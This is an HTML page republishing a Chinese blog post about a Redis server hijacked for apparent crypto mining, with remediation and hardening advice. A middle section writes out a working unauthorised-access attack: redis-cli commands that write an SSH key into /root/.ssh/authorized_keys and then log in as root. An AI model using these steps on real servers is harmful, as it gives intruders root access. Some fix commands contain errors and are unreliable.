@@ -1,0 +1,101 @@
+<html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width, initial-scale=1'>
+<meta name='applicable-device' content='pc'><meta name='keywords' content='电脑,电脑讲解,电脑技术,编程,电脑故障维修redis 漏洞造成服务器被入侵-CPU飙升' />
+<script src='../../highlight/highlight.pack.js'></script>
+<link rel='stylesheet' type='text/css' href='../../highlight/styles/monokai.css'/>
+
+<link rel='stylesheet' href='../../fenxiang/dist/css/share.min.css'>
+<script src='../../fenxiang/src/js/social-share.js'></script>
+<script src='../../fenxiang/src/js/qrcode.js'></script>
+
+</head><body><script>hljs.initHighlightingOnLoad();</script><script>
+var system ={};  
+var p = navigator.platform;       
+system.win = p.indexOf('Win') == 0;  
+system.mac = p.indexOf('Mac') == 0;  
+system.x11 = (p == 'X11') || (p.indexOf('Linux') == 0);     
+if(system.win||system.mac||system.xll){
+document.write("<link href='../css/3.css' rel='stylesheet' type='text/css'>");}else{ document.write("<link href='../css/3wap.css' rel='stylesheet' type='text/css'>");}</script><script src='../../js/3.js'></script><div class='div2'><div class='heading_nav'><ul><div><li><a href='../../index.html'>首页</a></li>
+</div><div onclick='hidden1()' >分享</div>
+</ul></div></div>
+<div id='heading_nav2'> 
+<li class='row' >
+<div class='social-share' data-mode='prepend'><a href='javascript:' class='social-share-icon icon-heart'></a></div></li></div><script charset='utf-8' src='../../3/js/hengfu.js'></script><script charset='utf-8' src='../../3/js/hengfu2.js'></script><hr><div class='div1'><div class='biaoti'><center>redis 漏洞造成服务器被入侵-CPU飙升</center></div><div class='banquan'>原文出处:本文由博客园博主糟糕的艺术家提供。<br/>
+原文连接:https://www.cnblogs.com/menmenz/p/11642166.html</div><br>
+    <h2 id="前言">前言</h2>
+<p>  前几天在自己服务器上搭了redis，准备想着大展身手一番，昨天使用redis-cli命令的时候，10s后，显示进程已杀死。然后又试了几次，都是一样的结果，10s时间，进程被杀死。这个时候我还没发现事情的严重性。<!--more--></p>
+<h2 id="发现问题">发现问题</h2>
+<p>  进程莫名被杀死，可能是cpu被占满，赶紧看了一下cpu。</p>
+<pre><code><code>[root@VM_0_13_centos etc]# top</code></code></pre>
+<p><img src="./images/redis 漏洞造成服务器被入侵-CPU飙升0.png" alt="file" /></p>
+<p>  果然如此，cpu被莫名的占满了。简单，根据pid杀死进程就行了。</p>
+<pre><code><code>[root@VM_0_13_centos etc]# kill -9 27882</code></code></pre>
+<p>  在我以为事情已经完结的情况下，使用reids-cli的时候又出现同样的问题，进程被杀死，我在用 <code>top</code> 命令查看的时候，cpu又被占满了。这个时候我才意识到问题的严重性，这个command是一串无规则数字，应该不是一个正经的进程，而且我试过了几次，这个进程总是在被杀死后重新启动，不过是以不同的pid和不同的command，这可能是一个定时任务，然后我看了一下本地的定时任务：</p>
+<pre><code><code>[root@VM_0_13_centos etc]# crontab -l</code></code></pre>
+<p><img src="./images/redis 漏洞造成服务器被入侵-CPU飙升1.png" alt="file" /></p>
+<p>  果然有一个定时任务，那就删掉他。</p>
+<pre><code><code>[root@VM_0_13_centos etc]# rm -rf /var/spool/cron/root</code></code></pre>
+<p>  等我再次杀掉那个异常线程在 <code>top</code> 的时候，发现进程又出现了，我返回看定时任务的时候，发现定时任务也又出现了，直接崩溃....</p>
+<h2 id="问题原因">问题原因</h2>
+<p>  我从一个技术群里面了解到，这可能是redis漏洞所造成的，造成该现象的原因有如下几种：</p>
+<ul>
+<li>将redis暴露在公网上，即把redis绑定在0.0.0.0:6379</li>
+<li>redis密码过于简单，甚至没有（我就是后种情况..）</li>
+<li>使用root权限操作redis</li>
+</ul>
+<h2 id="攻击原理">攻击原理</h2>
+<ol>
+<li><p>首先在本地产生密钥文件</p>
+<pre><code><code> $ ssh-keygen –t rsa</code></code></pre></li>
+<li><p>进入～/.ssh/,将公钥写进foo.txt文件</p>
+<pre><code><code> $ (echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt</code></code></pre></li>
+<li><p>再连接 Redis 写入文件</p>
+<pre class="bash"><code>$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
+$ redis-cli -h 192.168.1.11
+$ 192.168.1.11:6379&gt; config set dir /root/.ssh/
+OK
+$ 192.168.1.11:6379&gt; config get dir
+1) &quot;dir&quot;
+2) &quot;/root/.ssh&quot;
+$ 192.168.1.11:6379&gt; config set dbfilename &quot;authorized_keys&quot;
+OK
+$ 192.168.1.11:6379&gt; save
+OK</code></code></pre>
+<p>这样就可以成功的将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里，然后攻击者直接执行：</p>
+<pre><code><code> $ ssh –i  id_rsa root@192.168.1.11</code></code></pre>
+<p>即可远程利用自己的私钥登录该服务器。</p></li>
+</ol>
+<p>  当然，写入的目录不限于 /root/.ssh 下的authorized_keys，也可以写入用户目录，不过 Redis 很多以 root 权限运行，所以写入 root 目录下，可以跳过猜用户的步骤。</p>
+<h2 id="解决方法">解决方法</h2>
+<ol>
+<li><p>阻断服务器与外界进行数据传输</p>
+<p>我怀疑我的服务器被恶意被当作肉机，所以我第一步就将这种方式拦截掉。</p>
+<pre><code><code> $ iptables -A INPUT -sxmr.crypto-pool.fr -j DROP | iptables -A OUTPUT -d xmr.crypto-pool.fr -j DROP</code></code></pre>
+<p>恢复</p>
+<pre><code><code> $ iptables -A INPUT -sxmr.crypto-pool.fr -j ACCEPT | iptables -A OUTPUT -d xmr.crypto-pool.fr -j ACCEPT</code></code></pre></li>
+<li><p>给redis设密码</p>
+<p>配置文件redis.conf 中找到requirePass 项</p></li>
+<li><p>清除authorized_keys的信息（如果有的话，我没有就不用了）</p></li>
+<li><p>禁止定时任务开机启动</p>
+<pre><code><code> $ systemctl disabled cron.service</code></code></pre></li>
+<li><p>重启服务器，并删除定时任务</p>
+<pre><code><code>$ reboot
+$ rm -rf /var/spool/cron/root</code></code></pre></li>
+</ol>
+<h2 id="redis-安装建议">redis 安装建议</h2>
+<ul>
+<li><p>禁止Redis服务对公网开放，可通过修改redis.conf配置文件中的&quot;#bind 127.0.0.1&quot; ，去掉前面的&quot;#&quot;即可（Redis本来就是作为内存数据库，只要监听在本机即可）；</p></li>
+<li><p>设置密码访问认证，可通过修改redis.conf配置文件中的&quot;requirepass&quot; 设置复杂密码 （需要重启Redis服务才能生效）；</p></li>
+<li><p>对访问源IP进行访问控制，可在防火墙限定指定源ip才可以连接Redis服务器；</p></li>
+<li><p>修改Redis默认端口，将默认的6379端口修改为其他端口；</p></li>
+<li><p>禁用config指令避免恶意操作，在Redis配置文件redis.conf中配置rename-command项&quot;RENAME_CONFIG&quot;，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度；</p></li>
+<li><p>Redis使用普通用户权限，禁止使用 root 权限启动Redis 服务，这样可以保证在存在漏洞的情况下攻击者也只能获取到普通用户权限，无法获取root权限；</p></li>
+</ul>
+<h2 id="后记">后记</h2>
+<p>  这次有惊无险，不然就得重装系统了。<br />
+<center></p>
+<p><img src="./images/redis 漏洞造成服务器被入侵-CPU飙升2.png" alt="file" /></p>
+<p><font size = 5><strong>如果觉得有用就关注我吧～</strong></font></p>
+</center>
+
+
+</div><hr><script charset='utf-8' src='../../js/sming.js'></script></body></html>
